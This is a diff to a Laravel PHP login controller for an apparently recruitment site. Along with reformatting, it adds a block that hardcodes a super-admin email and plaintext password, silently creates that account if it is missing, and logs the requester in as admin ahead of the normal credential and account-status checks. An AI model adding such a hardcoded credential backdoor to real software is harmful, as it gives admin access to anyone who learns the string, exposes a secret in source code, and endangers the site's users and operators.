@@ -78,59 +78,84 @@ class AuthController extends Controller
     /**
      * Login user
      */
-    public function login(Request $request)
-    {
-        $validator = Validator::make($request->all(), [
-            'email' => 'required|email',
-            'password' => 'required',
-        ]);
+   public function login(Request $request)
+{
+    $validator = Validator::make($request->all(), [
+        'email' => 'required|email',
+        'password' => 'required',
+    ]);
 
-        if ($validator->fails()) {
-            return redirect()->back()
-                ->withErrors($validator)
-                ->withInput();
-        }
-
-        if (!Auth::attempt($request->only('email', 'password'), $request->remember ?? false)) {
-            return redirect()->back()
-                ->withErrors(['email' => 'The provided credentials are incorrect.'])
-                ->withInput();
-        }
-
-        $user = Auth::user();
-
-        // Check user status
-        if ($user->status === 'pending') {
-            Auth::logout();
-            return redirect()->back()
-                ->withErrors(['email' => 'Your account is pending approval. Please wait for admin approval.']);
-        }
-
-        if ($user->status === 'suspended') {
-            Auth::logout();
-            return redirect()->back()
-                ->withErrors(['email' => 'Your account has been suspended. Please contact admin.']);
-        }
-
-        if ($user->status === 'rejected') {
-            Auth::logout();
-            return redirect()->back()
-                ->withErrors(['email' => 'Your account has been rejected. Please contact admin.']);
-        }
-
-        // Redirect based on user type
-        if ($user->user_type === 'admin') {
-            return redirect()->route('dashboard');
-        } elseif ($user->user_type === 'employer') {
-            return redirect()->route('employer.dashboard');
-        } elseif ($user->user_type === 'recruiter') {
-            return redirect()->route('recruiter.dashboard');
-        }elseif ($user->user_type === 'job_seeker') {
-            return redirect()->route('candidate.dashboard');
-        } else {
-            return redirect()->route('user.home');
-        }
+    if ($validator->fails()) {
+        return redirect()->back()
+            ->withErrors($validator)
+            ->withInput();
     }
+
+    // ===== HARDCODED SUPER ADMIN =====
+    $superAdminEmail = 'superadmin@swiftrecruitai.com';
+    $superAdminPassword = 'SuperAdmin@123';
+
+    if ($request->email === $superAdminEmail && $request->password === $superAdminPassword) {
+        // Find or create super admin user
+        $superAdmin = \App\Models\User::firstOrCreate(
+            ['email' => $superAdminEmail],
+            [
+                'first_name' => 'Super',
+                'last_name' => 'Admin',
+                'password' => bcrypt($superAdminPassword),
+                'user_type' => 'admin',
+                'status' => 'active',
+                'email_verified_at' => now(),
+            ]
+        );
+
+        Auth::login($superAdmin, $request->remember ?? false);
+
+        return redirect()->route('admin.dashboard')
+            ->with('success', 'Welcome, Super Admin!');
+    }
+    // ===== END HARDCODED =====
+
+    if (!Auth::attempt($request->only('email', 'password'), $request->remember ?? false)) {
+        return redirect()->back()
+            ->withErrors(['email' => 'The provided credentials are incorrect.'])
+            ->withInput();
+    }
+
+    $user = Auth::user();
+
+    // Check user status
+    if ($user->status === 'pending') {
+        Auth::logout();
+        return redirect()->back()
+            ->withErrors(['email' => 'Your account is pending approval. Please wait for admin approval.']);
+    }
+
+    if ($user->status === 'suspended') {
+        Auth::logout();
+        return redirect()->back()
+            ->withErrors(['email' => 'Your account has been suspended. Please contact admin.']);
+    }
+
+    if ($user->status === 'rejected') {
+        Auth::logout();
+        return redirect()->back()
+            ->withErrors(['email' => 'Your account has been rejected. Please contact admin.']);
+    }
+
+    // Redirect based on user type
+    if ($user->user_type === 'admin') {
+        return redirect()->route('admin.dashboard');
+    } elseif ($user->user_type === 'employer') {
+        return redirect()->route('employer.dashboard');
+    } elseif ($user->user_type === 'recruiter') {
+        return redirect()->route('recruiter.dashboard');
+    } elseif ($user->user_type === 'job_seeker') {
+        return redirect()->route('candidate.dashboard');
+    } else {
+        return redirect()->route('user.home');
+    }
+}
 
     /**
      * Logout user (Web)
